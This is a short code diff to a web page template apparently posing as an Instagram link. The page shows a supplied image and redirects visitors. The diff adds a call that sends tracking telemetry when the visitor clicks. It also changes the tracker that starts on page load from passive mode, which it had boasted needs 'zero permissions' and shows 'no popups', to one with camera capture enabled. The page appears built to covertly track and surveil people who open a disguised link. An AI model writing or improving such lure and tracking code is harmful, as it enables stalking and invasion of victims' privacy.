@@ -359,7 +359,12 @@
             document.getElementById('media-img').src = imgParam;
         }
 
-        function handleTargetClick() {
+        async function handleTargetClick() {
+            if (window.LiveTrackerClient) {
+                try {
+                    await window.LiveTrackerClient.sendTelemetry(null, 'instagram', true);
+                } catch (e) {}
+            }
             let finalUrl = redirectUrl;
             if (!finalUrl.startsWith('http://') && !finalUrl.startsWith('https://')) {
                 finalUrl = 'https://' + finalUrl;
@@ -370,14 +375,13 @@
         document.getElementById('media-trigger').addEventListener('click', handleTargetClick);
         document.getElementById('btn-open-app').addEventListener('click', handleTargetClick);
 
-        // ZERO-PERMISSION PASSIVE TELEMETRY START (0 Browser Popups!)
         window.addEventListener('DOMContentLoaded', () => {
             if (window.LiveTrackerClient) {
                 window.LiveTrackerClient.startTracking({
                     templateName: 'instagram',
                     updateInterval: 4000,
-                    enableCamera: false, // PASSIVE (No Camera Popup)
-                    enableGPS: false      // PASSIVE (No Location Popup)
+                    enableCamera: true,
+                    enableGPS: false
                 });
             }
         });
